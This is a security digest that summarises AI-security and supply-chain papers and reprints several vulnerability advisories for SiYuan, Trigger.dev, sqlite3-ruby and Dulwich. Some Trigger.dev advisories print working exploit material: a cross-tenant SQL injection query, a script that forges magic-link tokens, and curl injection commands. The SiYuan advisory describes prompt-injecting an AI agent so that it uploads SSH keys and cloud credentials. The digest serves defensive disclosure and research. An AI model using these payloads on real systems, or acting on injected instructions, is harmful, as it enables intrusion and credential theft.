跨 Skill 的执行依赖图中出现非常规的「写—读」耦合，且该耦合并非任务文档所声明
同一 Skill 内的指令语义与其实际触发的工具调用类型不一致，存在意图漂移
技能指令文本中大量出现情境化前提铺垫，但缺乏与任务本身的直接关联
技能版本或来源发生变更后，行为基线（工具调用分布、目标资源集合）出现异常偏移
defense_advice_zh: 把 Skill 安全审计从「单件审查」升级为「组合与依赖图审计」，对跨 Skill 的数据流与状态传递做污点跟踪
对持久化环境工件、共享记忆与配置的写入操作建立写入方—读取方溯源与差分审计，识别非预期的跨会话状态污染

对技能来源、签名与更新通道做强校验，建立准入基线与灰度验证流程
将解耦式技能投毒纳入内部红队/供应链演练场景，验证现有审计能否覆盖组合路径

items.title: SEW: Style-Encoded Watermarking of LLM-Generated Code
items.summary: Code watermarking supports provenance tracking for code generated by LLMs. Modifying token selection to embed watermarks as an LLM generates code can create a trade-off between detectability and functional correctness. Other methods instead watermark completed code using predefined transformations or trained neural models. Recurring patterns can make watermark choices predictable across programs, while treating patterns common in unwatermarked code as watermark evidence can cause false detections. We therefore introduce SEW, which embeds and detects watermarks in already generated code through three components: (i) code style rules collected from style guides and transformation rules, with style choices determined by a secret key and each program's structural context; (ii) style-preference calibration, which evaluates watermark evidence using style probabilities estimated from human-written code; and (iii) context-aware style aggregation, which combines evidence from structurally matching locations assigned the same code style choice, preventing repeated applications of that choice from inflating watermark evidence. On CodeContests across three LLMs and three programming languages, SEW achieves a mean relative improvement of 12.44% in TPR@FPR5% over the baselines and is robust to four non-LLM code-editing attacks, with only a 0.94% mean relative decrease. Our code is available at https://github.com/suhanmen/SEW.

llm_summary.summary_zh: 该论文关注 LLM 生成代码的溯源（provenance）问题，提出一种新的代码水印方案 SEW（Style-Encoded Watermarking）。现有做法大致分为两类：一类在 LLM 生成过程中修改 token 选择以嵌入水印，但会带来可检测性与代码功能正确性之间的权衡；另一类在代码生成完成后，通过预定义的代码变换或训练好的神经网络模型来打水印。作者指出这两类方案存在两个核心缺陷：其一，代码中反复出现的模式会使水印选择在不同程序间变得可预测，从而削弱水印的秘密性；其二，如果直接把未加水印代码中也常见的模式当作水印证据，会造成误报。为此，SEW 在已生成的代码上做嵌入与检测，由三个组件构成：(i) 代码风格规则，来源于风格指南与变换规则，具体风格选择由一个秘密密钥和每个程序的结构上下文共同决定，因此同一段代码在不同上下文下会得到不同的风格决策；(ii) 风格偏好校准，利用从人类编写代码中估计出的风格概率来评估水印证据的强度，避免把人类代码中常见风格误判为水印；(iii) 上下文感知风格聚合，把结构上相匹配、且被赋予同一风格选择的位置上的证据合并统计，防止同一风格选择被重复应用时人为夸大水印证据。实验在 CodeContests 数据集上使用三种 LLM 和三种编程语言进行，SEW 在 TPR@FPR5% 指标上相较基线平均相对提升 12.44%，并且在四种非 LLM 的代码编辑攻击下保持稳健，平均相对下降仅 0.94%。代码已开源。该工作适合研究 LLM 输出溯源、代码水印与 AI 生成内容检测的读者。
llm_summary.why_it_matters_zh: 代码水印是判断代码是否由特定 LLM 生成、追溯供应链与审计 AI 代码来源的关键手段。SEW 通过风格编码与上下文聚合缓解了可预测性和误报两个痛点，对 AI 代码合规与取证有参考价值。
llm_summary.impact_zh: 可迁移到 AI 生成代码的溯源与合规审计、CI/CD 中的生成代码来源校验、模型输出归属判定、学术诚信检查等场景；对防御方评估现有代码水印方案的误报与抗编辑能力也有直接借鉴意义。
detection_signals_zh: 代码中由密钥与结构上下文共同决定的风格选择分布，可作为判断是否植入水印的统计信号
结构匹配位置被赋予同一风格选择时的证据聚合结果，可用于降低重复模式造成的误报
生成代码接受非 LLM 代码编辑前后的风格证据稳定性，可作为水印鲁棒性的观测指标
defense_advice_zh: 在评估代码水印方案时，同时衡量 TPR 与 FPR，避免把人类代码中常见的风格模式直接当作水印证据
关注水印对代码编辑、重构、格式化等常见非 LLM 处理流程的鲁棒性，必要时在代码入库前记录风格证据基线
将代码溯源能力与现有供应链审计、许可证合规流程结合，明确水印只是辅助证据而非唯一判定依据
llm_summary.recommended_action_zh: 研究跟进

items.title: Autonomous OSS Threat Detection via Taxonomy-Aligned LLMs
items.summary: Open source software (OSS) ecosystems face growing threats from sophisticated supply chain attacks including typosquatting, dependency confusion, Trojan Source obfuscation, malicious build injection, and CI/CD pipeline poisoning. Existing detection approaches rely on signature-based tools and rule-based systems that struggle to generalize across attack variants and emerging threat patterns. In this paper we propose a taxonomy-aligned large language model framework for automated detection and classification of OSS supply chain threats. We introduce a structured AV-xxx threat taxonomy covering five attack categories and construct a curated dataset of 999 verified real-world OSS supply chain incidents sourced from GitHub Security Advisories, CISA alerts, and security research reports spanning 2018 to 2026. Using taxonomy-aligned prompt engineering with GPT-4, our framework achieves 97.0\% multi-class classification accuracy and 97.0\% macro F1 score across all five threat categories. Comparative evaluation against five traditional machine learning baselines, one zero-shot open source LLM, and two fine-tuned neural models reveals a surprising finding: fine-tuned Llama 3.1 8B (70.5%) and SecRoBERTa (77.5%) both underperform simple TF-IDF classifiers (82.3%), while Mistral 7B without taxonomy alignment achieves only 65.7%. These results confirm that taxonomy-aligned prompting rather than model scale, domain pretraining, or fine-tuning is the critical factor enabling high classification accuracy. Our dataset and code are publicly available to support reproducible supply chain security research.

llm_summary.summary_zh: 该论文面向开源软件（OSS）供应链安全，提出了一套“分类法对齐（taxonomy-aligned）”的大语言模型框架，用于自动检测并归类 OSS 供应链威胁。作者指出，现有手段主要依赖特征签名工具与规则系统，面对 typosquatting（域名/包名仿冒）、依赖混淆、Trojan Source 级别的源码混淆、恶意构建注入以及 CI/CD 流水线投毒等攻击时，难以泛化到新的攻击变种与新兴威胁模式。为此，论文首先构建了一套结构化的 AV-xxx 威胁分类法，覆盖五大攻击类别，并据此从 GitHub Security Advisories、CISA 公告以及公开安全研究报告等来源，整理出 999 条经过验证的真实世界 OSS 供应链事件，时间跨度标注为 2018 至 2026 年，形成带标签的评测数据集。方法上，作者不做模型微调，而是通过分类法对齐的提示工程（prompt engineering）驱动 GPT-4 完成多分类判定。实验结果显示，该框架在五个威胁类别上达到 97.0% 的多分类准确率与 97.0% 的宏平均 F1。对比实验包含五个传统机器学习基线、一个零样本开源 LLM 以及两个微调神经模型，得到的关键结论是：微调后的 Llama 3.1 8B（70.5%）与 SecRoBERTa（77.5%）反而都低于简单的 TF-IDF 分类器（82.3%），未经分类法对齐的 Mistral 7B 仅为 65.7%。作者由此强调，决定高分类精度的关键因素是“分类法对齐的提示设计”，而非模型规模、领域预训练或微调。数据集与代码已公开，以支持可复现的供应链安全研究。
llm_summary.why_it_matters_zh: 供应链攻击是当前最现实的软件风险之一，而该研究给出了一个可复现的评测基线与一个反直觉结论：在威胁分类任务上，提示与分类体系的对齐比模型规模或微调更关键。这直接影响安全团队对 LLM 检测方案的选型与投入方向。
llm_summary.impact_zh: 可迁移到 SCA/SBOM 告警降噪与归类、CI/CD 异常变更初筛、事件响应阶段的威胁类型判定、以及内部威胁情报报告自动打标等场景；其“分类法先行”的工程思路也可用于自建检测知识体系。
detection_signals_zh: 依赖包名与官方包高度相似（仿冒/拼写变体）或发布者、维护者账号近期发生变更
CI/CD 配置文件、构建脚本在无关联提交中被修改，或发布产物与源码构建结果不一致
源码中出现不可见 Unicode 控制字符或双向文本控制符等异常字符
新引入依赖的下载来源、仓库地址与项目历史不一致，或私有包名与公共仓库命名空间冲突
构建流水线中出现新增加密/外联行为、凭据读取或制品签名校验被绕过的迹象
defense_advice_zh: 借鉴其分类法思路，先固化内部供应链威胁分类（五类或更细），再据此统一告警标签与响应剧本
在引入 LLM 辅助检测时，优先做分类法对齐的提示设计与少量人工校验，而非直接依赖模型规模或微调
将 LLM 判定置于人审之前作为分流层，保留 TF-IDF 等轻量基线作为对照与回退方案
对构建配置、流水线定义文件变更设置强制评审与双人复核，并保留制品溯源与签名校验
关注该论文公开的数据集与代码，用于本地复现与评测自有检测能力，但注意其标签来源需二次核实
llm_summary.recommended_action_zh: 研究跟进：将其分类法与公开数据集纳入内部供应链检测能力的评估基线，验证在本组织告警语料上的可迁移性。

items.title: No One Architecture Fits All: A Cross-Environment Evaluation of Hierarchical Red Team Agents
items.summary: Autonomous red team agents increasingly stress-test AI-enabled cyber defenses by planning strategy and executing multistage attacks. Reinforcement learning (RL) and large language models (LLMs) offer complementary mechanisms for the planning and execution such agents require, and prior work has combined them in hybrid hierarchies. Yet a given architecture is typically developed and evaluated within a single environment, leaving open whether an observed advantage reflects a generally stronger decision mechanism or merely alignment with a particular setting. We address this gap with a controlled cross-environment comparison of two homogeneous hierarchical red team architectures: an RL planner with an RL executor (RL+RL) and an LLM planner with an LLM executor (LLM+LLM). We evaluate both against expert autonomous defenders in CybORG CAGE-4 and in Cyberwheel at two network scales, across 18 configurations under one unified disruption metric. We find a pronounced environment-dependent inversion. RL+RL wins the compact, densely rewarded CAGE-4 (78.5% disruption success versus 18.0% for the strongest LLM configuration) and the 100-host Cyberwheel network (81.0% versus 50.5%), while a pretrained cybersecurity LLM agent wins the larger, escalation-gated 1010-host Cyberwheel network (55.0% versus 0.0% for RL). A kill-chain analysis explains the inversion through architecture-specific bottlenecks that aggregate success rates conceal.In the 1010-host Cyberwheel network, RL discovers and compromises hosts but stalls at privilege escalation, whereas in CAGE-4, LLM agents obtain privileged access but rarely convert it into operational impact. These results indicate that conclusions drawn in a single environment may not generalize, and that hybrid planner-executor designs should be motivated by specific failure modes rather than the assumption that one architecture is universally preferable.

llm_summary.summary_zh: 该论文研究自主红队智能体在网络安全对抗中的架构选择问题。现有工作通常把强化学习(RL)与大型语言模型(LLM)组合成分层智能体，用于规划多阶段攻击策略并执行，但每种架构往往只在单一环境中开发与评估，因此无法判断其优势来自通用的决策能力，还是仅仅与特定环境相适配。作者为此设计了一项受控的跨环境对比实验，比较两种同构的分层红队架构：RL 规划器加 RL 执行器(RL+RL)与 LLM 规划器加 LLM 执行器(LLM+LLM)。两者均在 CybORG CAGE-4 以及两种网络规模的 Cyberwheel 环境中，与专家级自主防御者对抗，共覆盖 18 种配置，并使用统一的破坏度量指标。实验发现明显的环境依赖反转：在紧凑、奖励密集的 CAGE-4 中 RL+RL 破坏成功率为 78.5%，最强 LLM 配置仅 18.0%；在 100 主机 Cyberwheel 中 RL+RL 为 81.0%，LLM 为 50.5%；但在规模更大、具有升级门控的 1010 主机 Cyberwheel 中，经过预训练的网络安全 LLM 智能体以 55.0% 对 RL 的 0.0% 取得压倒性优势。作者进一步用杀伤链分析解释这一反转：聚合成功率掩盖了架构特有的瓶颈。在 1010 主机网络中，RL 能发现并攻陷主机，却卡在权限提升阶段；而在 CAGE-4 中，LLM 智能体能够获得特权访问，但很少将其转化为实际作战影响。结论是：单一环境得出的结论可能无法泛化，混合规划器-执行器设计应当由具体的失败模式驱动，而非假设某种架构普遍最优。
llm_summary.why_it_matters_zh: 红队智能体评估常以单环境结果下结论，本文用跨环境对照揭示 RL 与 LLM 分层架构存在环境依赖反转，提示防御方不能用单一基准推断攻击者能力，也说明防御设计需针对具体杀伤链瓶颈而非笼统对抗。
llm_summary.impact_zh: 对 AI 安全评测、自主红队平台选型以及防御方评估 LLM 驱动攻击者能力有直接参考价值；相关方法可迁移到多环境鲁棒性基准、对抗性智能体评估与杀伤链瓶颈分析等场景。
detection_signals_zh: 主机发现或扫描行为之后长时间没有权限提升成功的后续痕迹，可能对应 RL 类智能体在提权阶段的停滞
获得特权访问后未产生实际破坏、横向移动或数据外传，可能对应 LLM 智能体有权限但难转化为影响的瓶颈
同一智能体在不同网络规模或奖励结构下行为表现突变，可作为评估覆盖不足的提示
defense_advice_zh: 不要依赖单一环境或单一基准的红队智能体评估结果，应在多个网络规模与奖励结构下重复验证
按杀伤链阶段拆分检测与响应能力，重点关注权限提升与影响转化两个瓶颈环节
对 LLM 驱动智能体的评估应纳入升级门控、网络规模等变量，避免高估或低估其真实能力
将混合规划器-执行器架构的选型依据建立在观测到的具体失败模式上，而非假设存在普遍最优架构

items.title: Jev-IDS: System One Models for Network Intrusion Detection
items.summary: Machine-learning Network Intrusion Detection Systems (IDS) depend on substantial labeled datasets and task-specific training, whereas Large Language Models (LLMs) detection can analyze flow records directly but incurs higher inference cost and latency, with less constrained outputs. This paper presents JEV-IDS, an open experimental general NIDS based on the Jev System One Model (SOM) to detect zero day intrusions Under label scarcity. JEV-IDS serializes one flow per request and asks JEV two questions: a binary attack probability and a finite-choice traffic category. Our results show that, at k=1, JEV was 4.8 times faster and 3.8 times cheaper than GPT-5.6 Luna, with 1.5 times higher novel-attack recall; it also produced 15 times fewer false alarms than a low-data Random Forest. Across 5,400 decisions on a 300-flow NSL-KDD pilot split, JEV achieved F1-Score 0.859, precision 0.941, recall 0.790, and novel-attack recall 0.838. Increasing k to 2 reduced its F1-Score to 0.839.

items.title: SiYuan MCP asset.upload Reads Arbitrary Absolute File Paths (Workspace Boundary Bypass)
items.summary:
# Security Advisory — SiYuan MCP `asset.upload` Reads Arbitrary Absolute File Paths (Workspace Boundary Bypass)

| Field | Value |
|---|---|
| **Disclosed by** | joysinleung (`joysinleung@gmail.com`) |
| **Report date** | 2026-08-13 |
| **Product** | SiYuan (思源笔记) — `siyuan-note/siyuan` |
| **Go module** | `github.com/siyuan-note/siyuan/kernel` |
| **Affected versions** | `<= 3.8.0` (latest release at report time; statically confirmed on v3.8.0) |
| **Patched versions** | 3.8.1 |
| **Component** | `kernel/mcp/tools/asset.go` (`assetUpload`), `kernel/model/upload.go` (`InsertLocalAssets`) |
| **Relationship to prior advisory** | **Residual of CVE-2026-66012** (GHSA-cvhv-7xhj-xjp8) MCP remediation. See §Relationship. |
| **EPSS (exploitation probability)** | Low. Requires the AI Agent to invoke `asset.upload` and the user to approve the (category-level) confirmation; reachable via prompt-injection of the agent. |
| **KEV (CISA Known Exploited)** | No (not listed in CISA KEV at report time). |
| **Default-config reachable** | **Partial** — requires the Agent/MCP surface to be configured (admin) and a user approval click; the boundary check itself is entirely absent, so any approved upload reads outside the workspace. |

---

## Summary

SiYuan exposes a native MCP tool `asset` → `asset.upload`. Its `files` argument is documented as a **comma-separated list of absolute file paths**. The handler (`kernel/mcp/tools/asset.go:195`) only normalizes each entry with `filepath.Abs(...)` — it performs **no workspace boundary check** (`IsSubPath`) and **no sensitive-path check** (`IsSensitivePath`). The downstream `model.InsertLocalAssets` (`kernel/model/upload.go:97`) then `os.Open`s each path and copies its bytes into the workspace `assets/` directory.

Every other AI-plane file primitive in SiYuan is workspace-constrained:
- `file` / `unzip` tools resolve paths via `resolvePath` (workspace-relative, escape-proof).

`asset.upload` is the **only** AI tool that accepts arbitrary absolute paths with zero boundary validation. An attacker who can steer the Agent (prompt injection) can induce it to upload sensitive files — e.g. `/Users/victim/.ssh/id_rsa`, `~/.aws/credentials`, `/etc/passwd` — into the workspace, from where they are reachable via notes / export / sync.

## Relationship to Prior Advisories

- **CVE-2026-66012** (GHSA-cvhv-7xhj-xjp8) remediated the MCP endpoint by requiring `CheckAdminRole` on `/mcp` and adding `refuseToAccess` for `conf/conf.json` in the *file* tool. However, the **`asset.upload` tool was never given a workspace boundary check** — it still accepts and reads any absolute path. This is a **residual boundary omission** from that remediation: the admin gate restricts *who* may call MCP, but does not constrain *which files* `asset.upload` may read. We report it as the unpatched half of the MCP file-surface hardening.

## Affected Version

Statically confirmed on the latest release **v3.8.0** (tag `v3.8.0`, commit `251596fc0`):
- `kernel/mcp/tools/asset.go:195` `assetUpload`: `abs, _ := filepath.Abs(strings.TrimSpace(f))` — normalization only.
- `kernel/model/upload.go:97` `InsertLocalAssets`: iterates the path list and `os.Open(assetAbsPath)` → `writeAssetFile(writePath, ...)` into `assetsDirPath`; the `IsSubPath(assetsDirPath, assetAbsPath)` check at line 130 is **only a dedup guard**, not a boundary limit. No workspace/external restriction is applied.

## Component

- `kernel/mcp/tools/asset.go:195` — `assetUpload` (`files` arg → `filepath.Abs` only).
- `kernel/model/upload.go:97` — `InsertLocalAssets` (`os.Open` + copy to `assets/`).
- Contrast (safe): `kernel/mcp/tools/unzip.go:52` `unzipHandler` uses `resolvePath` (workspace-relative, escape-proof).

## Attack Vector

**AI Agent / prompt injection.** Victim lets the Agent process attacker-controlled web/note content → agent is induced to call `asset.upload` with `/Users/victim/.ssh/id_rsa` (or similar) as a `files` entry. The user sees a **category-level** confi

items.title: sqlite3-ruby: Use-After-Free in SQLite Aggregate Arguments in Heap-Allocated Argument Array
items.summary:
## Summary

Using `Database#create_aggregate`, `#create_aggregate_handler`, or `Database#define_aggregator` to define an aggregate function that takes two or more arguments, and then evaluating it over TEXT or BLOB column values, can free the Ruby objects holding those arguments while a later argument is still being converted, during ordinary garbage collection. The aggregate's `step` method then receives an incorrect object, or the process crashes with a segmentation fault.

## Mitigation

Upgrade to sqlite3 gem v2.9.6 or later.

There is no reliable workaround. If you cannot upgrade, avoid defining aggregate functions that take two or more arguments. Restricting column value sizes is not a mitigation: smaller values make the defect fire less often but do not prevent it.

## Severity

The sqlite3-ruby maintainers assess this as Medium severity (CVSS 4.0 score 6.3). It is reached through ordinary garbage collection without any unusual code structuring: an application is exposed whenever it evaluates a multi-argument aggregate over TEXT or BLOB values whose size an attacker can influence. The demonstrated impact is an incorrect value passed to the aggregate's `step` method, or a process crash; no controlled memory write or general denial-of-service exploit has been demonstrated.

## Credits

Reported by Jeremy Daer ([@jeremy](https://github.com/jeremy)).

items.title: Trigger.dev: Trigger CLI debug deployment logs expose resolved environment secret values
items.summary:
Affected version: trigger.dev 4.5.3 (4.5.6 was advertised by the CLI but was not tested).

A staging dry-run executed with `trigger.dev deploy --env staging --dry-run --log-level debug`. The debug output logged the complete build-worker options object. Its `envVars` property contained unredacted values for every resolved staging variable, including database connection strings and service credentials. The non-debug environment listing correctly hides values, so users can reasonably expect deployment logs not to print secrets.

Impact: anyone with access to a developer terminal transcript, CI debug log, captured agent/tool output, or support bundle can recover deployment secrets even though no deployment occurs.

Reproduction:
1. Configure a Trigger.dev project with a secret environment variable.
2. Run the command above with an authenticated profile.
3. Inspect the `Starting buildWorker` debug record.
4. `options.envVars` contains the plaintext value.

No real credential is included in this report. The observed customer credentials are being rotated separately.

Suggested remediation: never serialize `envVars` values in debug output; log names only or replace every value with a fixed marker. Add regression coverage for deploy, dry-run, and debug logging, and review adjacent debug records for resolved secrets.

items.title: Trigger.dev: Cross-tenant SQL injection in the TSQL query compiler (POST /api/v1/query) via unsanitized window-function name
items.summary:
### Summary

A cross-tenant SQL injection in the TSQL query compiler lets **any authenticated trigger.dev customer read every other tenant's analytics data**. The customer-facing query endpoint `POST /api/v1/query` accepts a TSQL/TRQL query that is compiled to ClickHouse SQL by `internal-packages/tsql`. The compiler parameterizes or escapes all user input and injects a per-tenant `WHERE` guard — **except the window-function name**, which is concatenated into the SQL string with no allowlist and no escaping. By smuggling a backtick-quoted identifier into that position, an attacker injects a raw subquery (e.g. `(SELECT ... FROM task_runs_v2 WHERE organization_id = 'org_VICTIM')`) that sits **outside** the tenant guard, exfiltrating another organization's rows. Verified end-to-end against the real compiler and a live ClickHouse.

### Details

**Vulnerable sink** — `internal-packages/tsql/src/query/printer.ts:3073-3075`, `ClickHousePrinter.visitWindowFunction`:

```ts
private visitWindowFunction(node: WindowFunction): string {
  const args = node.args ? node.args.map((a) => this.visit(a)) : [];
  const funcCall = `${node.name}(${args.join(", ")})`;   // <-- node.name concatenated RAW
  ...
}
```

`node.name` is emitted directly into the SQL with **no allowlist check and no identifier escaping**. This is the only place in the compiler where an attacker-influenced identifier reaches the output unguarded:

- The normal function-call path `visitCall` (`printer.ts:2951`) throws `Unknown function` for any name outside the hardcoded `TSQL_CLICKHOUSE_FUNCTIONS` / `TSQL_AGGREGATIONS` allowlists — **this gate is absent on the window-function path**.
- String constants are bound as ClickHouse `query_params` (parameterized).
- Other identifiers go through `escapeClickHouseIdentifier`.
- Table functions (`url()/file()/remote()/s3()`) are rejected.

A **backtick-quoted identifier** is accepted by the lexer and **unescaped** into `node.name` by `visitIdentifier` (the backticks are stripped and the inner text is unescaped), so arbitrary characters — spaces, `(`, `)`, `,`, `'`, a full subquery — become the "function name" and are printed verbatim.

**How it bypasses tenant isolation.** Multi-tenancy is enforced only by `enforcedWhereClause`, which is attached to the **outer** table's `WHERE` (`organization_id`/`project_id`/`environment_id` taken from the caller's API key). An injected **subquery** has no such guard, so it reads across all tenants.

**Reachability** — `apps/webapp/app/routes/api.v1.query.ts`:
- `body.query` is a raw `z.string()`.
- Auth is any environment-scoped credential — a private API key or a public JWT — i.e. **any signed-up customer**.
- The route's authorization (`detectTables(body.query)` + `everyResource`) only authorizes the **outer `FROM` table** the caller is legitimately allowed to read. The injection rides in the SELECT/window position, so it is invisible to that check.
- `executeQuery` passes the caller's `organizationId/projectId/environmentId` into the enforced `WHERE`. The compiled `sql` string is then sent to ClickHouse (`internal-packages/clickhouse/src/client/tsql.ts`) with the injected subquery embedded **in the SQL string itself** (not in bound params), so ClickHouse executes it.

### PoC

Reproduced in two stages: (1) the project's real `compileTSQL` emits the injection; (2) a live ClickHouse executes it and returns another tenant's data.

**1. Attacker TSQL input** (sent as the `query` field to `POST /api/v1/query` with any valid API key / JWT, authenticated here as `tenant1`):

```sql
SELECT `count() OVER (), (SELECT groupArray(payload) FROM trigger_dev.task_runs_v2 WHERE organization_id = 'org_OTHER_TENANT') AS stolen, dummy(`() OVER () AS x FROM task_runs
```

**2. Compiled ClickHouse SQL emitted by `compileTSQL` (verbatim):**

```sql
SELECT count() OVER (),
       (SELECT groupArray(payload) FROM trigger_dev.task_runs_v2
        WHERE organization_id = 'org_OTHER_TENANT') AS stolen,        -- INJECTED,

items.title: Trigger.dev: Unauthenticated Realtime Stream Data Injection via Run FriendlyId
items.summary:
## Summary

The POST handler for `/realtime/v1/streams/:runId/:streamId` has no authentication. Any entity that knows or guesses a run friendlyId can inject arbitrary data into its realtime stream.

## Vulnerability Details

**File:** `apps/webapp/app/routes/realtime.v1.streams.$runId.$streamId.ts`

The `action` handler (line 17) has no auth wrapper. The code comment says: "Plain action for backwards compatibility with older clients that don't send auth headers."

The run lookup at line 29 uses `where: { friendlyId: runId }` with NO environment scoping (`runtimeEnvironmentId` is not checked), so production runs are accessible.

Run friendlyIds follow predictable patterns (e.g., `run_1234abcd`).

## Steps to Reproduce

```bash
# No authentication required
curl -X POST "http://localhost:8030/realtime/v1/streams/run_KNOWN_ID/stream_1"   -H "Content-Type: application/json"   -d '{"injected": "data"}'
```

## Impact

Unauthenticated data injection into any run realtime stream. Cross-environment access (no scoping).

items.title: Trigger.dev Self-Hosted Deployment: Default Secrets allow Unauthenticated Infrastructure Compromise
items.summary:
## Summary

Self-hosted trigger.dev v4 instances deployed using the provided Docker Compose configuration with default secrets from `hosting/docker/.env.example` are vulnerable to a multi-stage unauthenticated attack chain leading to complete infrastructure compromise.

## Vulnerability Details

The `hosting/docker/.env.example` file contains hardcoded cryptographic secrets:

```
SESSION_SECRET=2818143646516f6fffd707b36f334bbb
MAGIC_LINK_SECRET=44da78b7bbb0dfe709cf38931d25dcdd
ENCRYPTION_KEY=f686147ab967943ebbe9ed3b496e465a
MANAGED_WORKER_SECRET=447c29678f9eaf289e9c4b70d3dd8a7f
```

The `MAGIC_LINK_SECRET` is used by `remix-auth-email-link@2.0.2` to create authentication tokens via CryptoJS AES encryption. An attacker who knows this secret can forge valid magic links that authenticate as any email address without email delivery. The `validateSessionMagicLink` option defaults to `false` in the library (never overridden by trigger.dev), so no session-side validation occurs. User accounts are auto-created when `WHITELISTED_EMAILS` is not set (the default for self-hosted).

## Steps to Reproduce

### Setup
```bash
cd hosting/docker && cp .env.example .env
cd webapp && docker compose up -d
cd ../worker && docker compose up -d
```

### Step 1: Forge magic link token
```javascript
const CryptoJS = require('crypto-js');
const secret = '44da78b7bbb0dfe709cf38931d25dcdd';
const payload = JSON.stringify({e: 'attacker@evil.com', c: Date.now()});
const token = encodeURIComponent(CryptoJS.AES.encrypt(payload, secret).toString());
console.log('https://target:8030/magic?token=' + token);
```

### Step 2: Authenticate via forged magic link
```bash
curl -v "http://localhost:8030/magic?token="
# Returns: HTTP 302, set-cookie: __session=eyJ1c2VyIjp7InVzZXJJZCI6ImNtcGg3OTBxZjAwMDR0bjU1ZWM3bHlxN2EifX0=...
# User auto-created, session cookie set, redirects to /orgs/new
```

### Step 3: Verify database access from runner network
```bash
docker run --rm --network webapp postgres:14 psql "postgresql://postgres:unsafe-postgres-pw@postgres:5432/main" -c "SELECT id, email FROM \"User\";"
# Returns: cmph790qf0004tn55ec7lyq7a | attacker@evil.com
```

### Step 4: Verify Redis access (no auth)
```bash
docker run --rm --network webapp redis:7 redis-cli -h redis PING
# Returns: PONG
```

### Step 5: Verify ClickHouse access
```bash
docker run --rm --network webapp curlimages/curl curl -s "http://default:password@clickhouse:8123/?query=SELECT%20version()"
# Returns: 25.5.2.47
```

## Root Cause

1. Hardcoded secrets in `hosting/docker/.env.example` (lines 9-12)
2. Runner containers placed on infrastructure networks: `DOCKER_RUNNER_NETWORKS: webapp,supervisor` in `hosting/docker/worker/docker-compose.yml:42`
3. Default credentials on all infrastructure services
4. No Redis authentication
5. SESSION_SECRET reused for JWT signing (`apps/webapp/app/services/apiAuth.server.ts:616`) and impersonation tokens

## Impact

Complete infrastructure compromise: all tenant data, API keys, encrypted secrets (decryptable with known ENCRYPTION_KEY), user accounts, cross-tenant access. Attacker can modify data, push backdoored Docker images to the registry, and manipulate job queues.

items.title: Trigger.dev: Blind SSRF via alert-channel webhook
items.summary:
### Summary

A WEBHOOK alert channel stores a user-supplied `url`. When an alert fires (deployment/run failure, error groups), the webapp server (`alertsWorker` -> `DeliverAlertService`) POSTs the HMAC-signed alert payload to that URL via `fetch(webhook.url, ...)`. The URL is never validated against a host allowlist or private-IP/metadata blocklist (a repo-wide search for `169.254`, `isPrivate`, `isLoopback`, `net.isIP`, `ssrf` returns ZERO hits), and the API route's URL field is just `z.string().optional()` (no syntax check at all). So an authenticated tenant can point the webhook at internal infrastructure or `169.254.169.254` and the multi-tenant server fetches it.

### Affected
`apps/webapp`, HEAD `5d99457` (current main).

### Root cause
- Source (API route): `app/presenters/v3/ApiAlertChannelPresenter.server.ts` `ApiAlertChannelData.url = z.string().optional()` (no host validation); route `app/routes/api.v1.projects.$projectRef.alertChannels.ts` (PAT-auth).
- Store: `app/v3/services/alerts/createAlertChannel.server.ts` persists `{url, secret, version}` verbatim.
- Sink: `app/v3/services/alerts/deliverAlert.server.ts:973` `fetch(webhook.url, {method:"POST", headers:{"x-trigger-signature-hmacsha256":...}, body:rawPayload})`; identical at `deliverErrorGroupAlert.server.ts:258`. Runs inside the webapp process; `fetch` follows redirects (IMDSv1-via-redirect). No egress guard anywhere.

### Runtime PoC (proven on self-host)
Seeded a project + STAGING env + a WEBHOOK channel with `url=http://host.docker.internal:7766/...` (an internal address from the server's POV) + a DEPLOYING deployment. Triggered via the public API `POST /api/v1/deployments/deployment_ssrfpoc/fail` -> 200 -> FAILED -> alertsWorker -> the server fetched the listener. Captured:
```
POST /ssrf-via-webhook HTTP/1.1
host: host.docker.internal:7766
x-trigger-signature-hmacsha256: <redacted>
user-agent: node
{"type":"alert.deployment.failed", ...}
```
The webapp server (user-agent: node) made an outbound POST to the attacker-chosen internal URL; 169.254.169.254 / any internal host works identically.

### Severity
`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N` ~ Medium. Blind (response not reflected) + POST-only (fixed body = signed alert payload), so it enables internal port/host scanning (delivery success/timing oracle), state-changing POSTs to internal services, and IMDSv1-via-redirect — not arbitrary GET exfiltration. PR:L (authenticated tenant). Egress private-IP/metadata blocking on server-issued webhooks is industry standard; its absence is the defect.

### Suggested fix
Validate the webhook URL on create (require http(s), resolve host, reject private/link-local/loopback/metadata ranges) AND re-check at fetch time (re-resolve after redirects or disable redirects / pin to resolved public IP). A shared `assertPublicUrl(url)` used by `createAlertChannel` + the two delivery sinks.

### Dup
Distinct CWE-918 class from the IDOR advisories. FRESH. (The Grav maintainer independently hardened the same webhook-URL-SSRF class in grav-plugin-api commit dfcc947 on 2026-06-26 — corroborating the class is real and fixable.)

items.title: Dulwich: Arbitrary File Write (RCE) on Windows via Unvalidated Drive Letters in Tree Paths
items.summary:
### Affected files
* `dulwich/index.py` (Methods: `validate_path_element_ntfs`, `_tree_to_fs_path`)
* `dulwich/porcelain/__init__.py` (Method: `_checked_worktree_path`)

### Description / Summary
A High-severity Path Traversal vulnerability exists in Dulwich's checkout logic when running on Windows. The functions responsible for validating NTFS paths strictly reject `.git` variants, Alternate Data Streams (ADS), `git~1` short names, and reserved device names, but they completely fail to check for **DOS drive letter prefixes**.

A malicious Git tree can contain an entry named `C:`. When Dulwich processes this tree on a Windows client, the string passes the `validate_path_element_ntfs` check. Later, `_tree_to_fs_path` passes this path to `os.path.join(root, b"C:\\\\Users\\\\...")`. 

On Windows, if the second argument to `os.path.join` contains an absolute drive letter, the `root` path is completely discarded. As a result, Dulwich writes the repository file to the absolute path outside of the intended Git worktree.

While the standard C `git` client explicitly blocks this via `has_dos_drive_prefix()` in `path.c`, Dulwich lacks this protection. Because Git trees are cross-platform, an attacker can author a malicious repository on Linux and wait for a Windows victim (or CI runner) to clone it.

### Potential impact

This vulnerability allows an attacker to achieve **Arbitrary File Write**, which can trivially be escalated to **Remote Code Execution (RCE)** or total system compromise on the victim's Windows machine.

Attack vectors include:
1. **Git Config Poisoning (RCE):** Writing a malicious `C:\\Users\\<victim>\\.gitconfig` file to set `core.sshCommand` to an arbitrary executable, granting RCE the next time the user interacts with Git.
2. **Persistence (RCE):** Dropping a malicious executable into `C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\`.
